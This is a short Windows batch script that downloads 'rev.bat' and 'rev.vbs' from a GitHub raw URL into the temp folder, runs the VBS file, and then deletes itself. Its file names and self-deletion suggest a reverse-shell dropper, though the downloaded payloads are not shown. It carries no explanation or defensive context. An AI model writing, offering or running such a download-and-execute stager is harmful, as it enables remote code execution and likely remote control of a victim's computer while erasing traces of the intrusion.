@echo off
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp%\rev.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%temp%\rev.vbs"
call "%temp%\rev.vbs"
del "%~f0"

